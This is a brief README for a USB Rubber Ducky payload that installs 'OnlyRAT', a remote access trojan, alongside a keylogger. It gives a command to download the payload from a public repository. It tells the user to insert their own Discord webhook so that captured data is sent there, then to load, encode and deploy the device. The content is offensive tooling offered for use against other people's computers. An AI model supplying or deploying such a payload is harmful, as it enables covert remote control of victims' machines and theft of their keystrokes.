## onlyduck.txt
This is an installer for OnlyRAT that uses the [USB Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky-deluxe).

## Download:
```bash
svn checkout https://github.com/CosmodiumCS/payloads/trunk/rubberducky/DucKey-Logger
```

## Instructions:
1. In line 18, replace `DISCORDWEBHOOK` with your discord webhook
```
STRING echo DISCORDWEBHOOK > lawFvVTikZ.txt
```
2. Load, Encode, and Deploy
